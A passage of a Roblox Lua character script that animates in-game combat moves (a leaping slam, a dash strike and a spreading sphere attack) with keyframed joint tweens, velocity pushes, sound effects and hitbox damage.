Animate(RH,cf(1,-0.1,-0.3)*angles(math.rad(46.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.7,-0.6)*angles(math.rad(49.1),math.rad(-53.3),math.rad(-41.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.8,-0.5)*angles(math.rad(41.8),math.rad(46.5),math.rad(42.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(28),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .3
Animate(RootJoint,cf(0,-0.8,-0.7)*angles(math.rad(-40.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.3,-1.5)*angles(math.rad(-23.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,0,-0.4)*angles(math.rad(41.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.5,-0.5)*angles(math.rad(42),math.rad(0),math.rad(-9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,-0.3)*angles(math.rad(36.8),math.rad(14.7),math.rad(12.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(10),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
RootPart.Anchored = false
attack = false
end


function WEEEEEEEEEEEEE()
attack = true
soundeffect(SoundTable["ModeChange Explosions"][math.random(1,#SoundTable["ModeChange Explosions"])],1,tors,10,0,"boom")
CamShakeAll2({
Duration=1; -- Lasts for .1 seconds
Intensity=3, -- Intensity of 5
Position=Vector3.new(2,2,2); -- What axises the shake effects and how much (position)
Rotation=Vector3.new(2,2,6); -- What axises the shake effects and how much (rotation)
DropDist=50; -- Camera dist from origin when the shake starts to gradually get weaker
IneffectiveDist=150; -- Camera dist from origin when the shake goes away
Origin=char["Torso"].Position; -- Where the shake is coming from (Part, CFrame, or Vector3)
})
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 3,
EasingStyle = "Sine",
EasingDirection = "InOut",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = Torso.CFrame*CFrame.new(0,-2,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
EndCFrame = Torso.CFrame*CFrame.new(0,-2,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(0,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(100,7.5,100),
Material = "Neon",
Reflectance = 0,
}
)
local e = Instance.new("BodyVelocity",RootPart)
e.MaxForce = Vector3.new(9999999,9999999,9999999)
e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(60),0,0)).LookVector * 250
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .4
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(-23),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.1,-1.1)*angles(math.rad(-30.7),math.rad(0),math.rad(-4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.2,0.1)*angles(math.rad(-18.6),math.rad(0),math.rad(4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.7,0.2)*angles(math.rad(-3.5),math.rad(33.2),math.rad(-19.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.7,0.1)*angles(math.rad(-15),math.rad(-13.7),math.rad(15.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-25.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(40),0,0)).LookVector * 200
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .2
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(-93.6),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.1,-1.1)*angles(math.rad(-15.8),math.rad(-0.9),math.rad(-3.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,-0.1,-0.3)*angles(math.rad(21.5),math.rad(2.4),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,1,0)*angles(math.rad(54.4),math.rad(0.1),math.rad(-35.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1,-0.1)*angles(math.rad(64.5),math.rad(12.5),math.rad(15)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(31.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(25),0,0)).LookVector * 150
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .25
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(143.4),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.1,-1.1)*angles(math.rad(-15.8),math.rad(-0.9),math.rad(-3.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,-0.1,-0.3)*angles(math.rad(21.5),math.rad(2.4),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.6,-0.5)*angles(math.rad(54.4),math.rad(0.1),math.rad(38.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.3,0.8,-0.5)*angles(math.rad(48.8),math.rad(22.5),math.rad(-31.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(35.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(15),0,0)).LookVector * 100
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .25
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(1.2),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.4,-0.9)*angles(math.rad(-28.8),math.rad(4),math.rad(-5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.4)*angles(math.rad(-5.2),math.rad(-4),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,0.8,0.1)*angles(math.rad(12.1),math.rad(5.8),math.rad(-46.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.8,0)*angles(math.rad(-4.7),math.rad(-4),math.rad(44.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-1.2),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

e:Destroy()
repeat
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .17
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(18.2),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.4,-0.7)*angles(math.rad(3.1),math.rad(0),math.rad(-8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.7,-0.2)*angles(math.rad(25.8),math.rad(0),math.rad(8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,1.1,0.3)*angles(math.rad(-3.5),math.rad(33.2),math.rad(-100.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.2,0.1)*angles(math.rad(-15.9),math.rad(-16.7),math.rad(95.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(37.5),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(22.2),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.4,-0.7)*angles(math.rad(9),math.rad(-0.8),math.rad(-8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.7,-0.2)*angles(math.rad(18.9),math.rad(-1),math.rad(7.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,1,-0.2)*angles(math.rad(-17),math.rad(6),math.rad(-113.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,1,-0.2)*angles(math.rad(-28.2),math.rad(9.7),math.rad(114.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(35.5),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(18.2),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.4,-0.7)*angles(math.rad(5.1),math.rad(-0.3),math.rad(-8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.7,-0.2)*angles(math.rad(31.7),math.rad(0.8),math.rad(8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.8,0.2)*angles(math.rad(-45.5),math.rad(-27.5),math.rad(-76.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.5,0.1)*angles(math.rad(-28.2),math.rad(9.7),math.rad(62.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(39.5),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)



until hitfloor ~= nil
hum.WalkSpeed = 0
--MARKET GARDEN TIME
local FUNNY = NewHitbox(RootPart.CFrame*CFrame.new(0,-3.5,0),Vector3.new(3,1,3))
DerpzDmgInstant(FUNNY)
--explode_residue(5,lleg,BrickColor.new("Medium stone grey").Color,hum.FloorMaterial,0,-1,1,5/10,1)
soundeffect(241486297,0.95,tors,10,0,"Land sfx")
soundeffect(268933841,1.1,tors,10,0,"Land sfx")
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .45
 Animate(RootJoint,cf(0,-0.8,-0.7)*angles(math.rad(-45.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.2,-1.2)*angles(math.rad(-16.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.1,-0.3)*angles(math.rad(46.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.7,-0.6)*angles(math.rad(49.1),math.rad(-53.3),math.rad(-41.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.8,-0.5)*angles(math.rad(41.8),math.rad(46.5),math.rad(42.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(28),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .3
 Animate(RootJoint,cf(0,-0.8,-0.7)*angles(math.rad(-40.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.3,-1.5)*angles(math.rad(-23.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,0,-0.4)*angles(math.rad(41.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.5,-0.5)*angles(math.rad(42),math.rad(0),math.rad(-9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,-0.3)*angles(math.rad(36.8),math.rad(14.7),math.rad(12.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(10),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

attack = false



end

function zoooooooom()
attack = true
hum.WalkSpeed = 0
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .09
Animate(RootJoint,cf(0,0.1,-0.1)*angles(math.rad(-11.3),math.rad(27.1),math.rad(5.2))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.9,-0.1)*angles(math.rad(-16.7),math.rad(1.9),math.rad(-6.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.2)*angles(math.rad(-12.2),math.rad(-26.5),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,1,0)*angles(math.rad(11.8),math.rad(-1.8),math.rad(-8.7)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.9,0)*angles(math.rad(10.1),math.rad(1.3),math.rad(7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(15.6),math.rad(-5.1),math.rad(-18.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 2

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .09
Animate(RootJoint,cf(-0.2,-0.4,-0.6)*angles(math.rad(-20.8),math.rad(26),math.rad(9.4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.7,-1.4)*angles(math.rad(-36.1),math.rad(3.9),math.rad(-5.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.2)*angles(math.rad(27.4),math.rad(-19.9),math.rad(17.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.5,0.4)*angles(math.rad(-16.9),math.rad(2.6),math.rad(-8.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.3,0.2,1.1)*angles(math.rad(96.4),math.rad(7.1),math.rad(22.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(0.3),math.rad(1.4),math.rad(-19.1)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 3

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .09
Animate(RootJoint,cf(-0.2,-0.1,-1.2)*angles(math.rad(-31.1),math.rad(3.8),math.rad(1.3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-0.9,-0.2,-1.4)*angles(math.rad(-24.8),math.rad(3.6),math.rad(-3.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,-1.1,0)*angles(math.rad(16.2),math.rad(-20),math.rad(17.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.4,0.6)*angles(math.rad(21.3),math.rad(4.2),math.rad(-18)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.3,0.3,0.9)*angles(math.rad(100.2),math.rad(11.2),math.rad(-0.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-1),math.rad(3),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--DASH STARTS NOW
local e = Instance.new("BodyVelocity",RootPart)
e.MaxForce = Vector3.new(9999999,9999999,9999999)
e.Velocity = (RootPart.CFrame).LookVector * 250
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.Out
local animatetime = .09
Animate(RootJoint,cf(-0.2,-0.1,-1.1)*angles(math.rad(-59.3),math.rad(26),math.rad(9.4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-0.2,0.2,-1.2)*angles(math.rad(-24.1),math.rad(-18.2),math.rad(-24.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-0.9,0.3)*angles(math.rad(-35.7),math.rad(-12.9),math.rad(-20.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.5,0.1)*angles(math.rad(-26.3),math.rad(-20.4),math.rad(-22.9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,1.6,-0.2)*angles(math.rad(140),math.rad(28.6),math.rad(19.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-28.9),math.rad(14.9),math.rad(-20.1)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
wait(.05)
rdm = math.random(5,7)
for i = 0,rdm do
e.Velocity = (RootPart.CFrame).LookVector * 225
wait(.05)
DerpzDmg({

Part = tors,
Magnitude = 15,
MinimumDamage = 50,
MaximumDamage = 75,
Type = "Normal"


})
end

e.Velocity = (RootPart.CFrame).LookVector * 175

--DASH END

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .18
Animate(RootJoint,cf(-0.2,-0.1,-0.4)*angles(math.rad(-128.4),math.rad(26),math.rad(9.4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-0.4,0,-0.9)*angles(math.rad(-41.6),math.rad(-11.7),math.rad(-29.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-0.9,0.3)*angles(math.rad(-54.6),math.rad(-4.5),math.rad(-24.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.5,0.2)*angles(math.rad(38.6),math.rad(-26.2),math.rad(5.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.5,-0.1)*angles(math.rad(123.1),math.rad(22.3),math.rad(31.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(17.9),math.rad(-5.9),math.rad(-15.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 6
e.Velocity = (RootPart.CFrame).LookVector * 150
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,-1.1,-1.3)*angles(math.rad(129.2),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-0.4,-0.6)*angles(math.rad(-20.7),math.rad(2.3),math.rad(-6.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.3,-0.6)*angles(math.rad(-42.1),math.rad(-6.3),math.rad(7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.2,1.1,0.2)*angles(math.rad(-125.1),math.rad(23.2),math.rad(-19.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.4,-0.1)*angles(math.rad(-168.5),math.rad(40.6),math.rad(7.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18),math.rad(0.7),math.rad(-5.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 7
e.Velocity = (RootPart.CFrame).LookVector * 100
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .08
Animate(RootJoint,cf(0,-0.8,-1.1)*angles(math.rad(83.1),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-0.7,0.4)*angles(math.rad(-72.2),math.rad(6.3),math.rad(-2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.2,0.3)*angles(math.rad(-71.7),math.rad(-8.9),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.2,0.8,-0.3)*angles(math.rad(-125.1),math.rad(23.2),math.rad(-46.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.3,-0.1)*angles(math.rad(151.9),math.rad(28.6),math.rad(31)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(28),math.rad(-0.3),math.rad(-5.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 8
e.Velocity = (RootPart.CFrame).LookVector * 50
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .07
Animate(RootJoint,cf(0,0.2,-1)*angles(math.rad(42.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1.5,0.3)*angles(math.rad(-39.5),math.rad(4.2),math.rad(-5.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.6,0.1)*angles(math.rad(-48.7),math.rad(-7.1),math.rad(6.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.2,0.6,-0.6)*angles(math.rad(-125.1),math.rad(23.2),math.rad(-70.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.4,-0.1)*angles(math.rad(126),math.rad(10.8),math.rad(40)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(36.8),math.rad(-1.2),math.rad(-5.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 9
e:Destroy()
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .35
Animate(RootJoint,cf(0,-0.1,-0.7)*angles(math.rad(-25.5),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1,0.1)*angles(math.rad(21.4),math.rad(-1.4),math.rad(-6.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.9,0)*angles(math.rad(28.3),math.rad(0),math.rad(7.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,0.4,-0.4)*angles(math.rad(29.6),math.rad(-47.6),math.rad(-19.5)),animatetime+.1,easingstyle,easingdir)
Animate(RW,cf(1.4,0.4,-0.4)*angles(math.rad(27.8),math.rad(39.8),math.rad(13.8)),animatetime+.1,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(24.6),math.rad(0),math.rad(-5.7)),animatetime+.1,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 10 got deleted because it's apart of keyframe 9


--KEYFRAME 11

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.InOut
local animatetime = .3
Animate(RootJoint,cf(0,-0.2,-0.6)*angles(math.rad(-1),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.8,-0.4)*angles(math.rad(3.3),math.rad(-0.4),math.rad(-6.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.8,-0.3)*angles(math.rad(-0.1),math.rad(-1.1),math.rad(7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.3,0.4)*angles(math.rad(18.5),math.rad(10),math.rad(-4.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.1,0.4)*angles(math.rad(24.8),math.rad(-4.5),math.rad(-4.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(8.4),math.rad(-2),math.rad(4.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 12

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .2
Animate(RootJoint,cf(0,-0.2,-0.6)*angles(math.rad(-1),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.8,-0.4)*angles(math.rad(3.3),math.rad(-0.4),math.rad(-6.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.8,-0.3)*angles(math.rad(-0.1),math.rad(-1.1),math.rad(7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.3,0.4)*angles(math.rad(18.5),math.rad(10),math.rad(-4.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.1,0.4)*angles(math.rad(24.8),math.rad(-4.5),math.rad(-4.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(8.5),math.rad(-0.7),math.rad(4.2)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

attack = false
hum.WalkSpeed = storehumanoidWS
end


function MayhemRipoff()
attack = true
hum.WalkSpeed = 0


local AttackSettings = {

Amount = 8, --This is the amount of spheres. If you want this to be OP, Go wild.
SetColorVal = Color3.fromRGB(0,0,150) --Change this to whatever you want. Could be the mode color, Or something else.

}


local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .25
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(14),math.rad(-35.5),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1.2,-0.2)*angles(math.rad(-29.2),math.rad(34.1),math.rad(4.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(12.4),math.rad(-31.5),math.rad(22.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,1.6,-0.2)*angles(math.rad(22.2),math.rad(22.5),math.rad(-7.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.7,0)*angles(math.rad(-9.8),math.rad(-8),math.rad(38.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(38),math.rad(21),math.rad(29.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .2
 Animate(RootJoint,cf(0.1,-1.1,-0.5)*angles(math.rad(-40.1),math.rad(-22.7),math.rad(-28))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-0.7,-0.2)*angles(math.rad(2.7),math.rad(32.1),math.rad(-13))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.4,-0.5)*angles(math.rad(-50.7),math.rad(-12.6),math.rad(47.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.3,-1.4)*angles(math.rad(36.9),math.rad(24.7),math.rad(6.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.6,0.1)*angles(math.rad(29.4),math.rad(22.1),math.rad(33.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(50.2),math.rad(30.5),math.rad(11.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local DistanceIncreaseVal = 0
local SetColorVal = AttackSettings.SetColorVal
local Amount = AttackSettings.Amount
for i = 0,Amount do
DistanceIncreaseVal = DistanceIncreaseVal + 1
local CFrameIncrease = DistanceIncreaseVal*1.5
local a = Instance.new("Part",char)
local Mesh = Instance.new("SpecialMesh",a)
Mesh.MeshType = Enum.MeshType.Sphere
a.Anchored = true
a.CanCollide = false
a.Color = SetColorVal
a.CFrame = RootPart.CFrame*CFrame.new(0,-3,-5-CFrameIncrease*DistanceIncreaseVal)
a.Size = Vector3.new(6*DistanceIncreaseVal,0.4,6*DistanceIncreaseVal)
a.Material = "Neon"
a.Transparency = 1
local aparticle = script.Effects.MayhemRipoffFX:Clone()
aparticle.Parent = a


delay(.1,function()
local SizeVal = a.Size.X/6
for i = 0,5,0.1 do
swait()
a.Transparency = a.Transparency - 1/50
end
wait(.5)
aparticle.Enabled = true
aparticle.Color = ColorSequence.new(Color3.new(1,1,1),SetColorVal)
aparticle.Drag = 0
local Regionlol = NewHitbox(a.CFrame,Vector3.new(6*SizeVal,6*SizeVal,6*SizeVal))
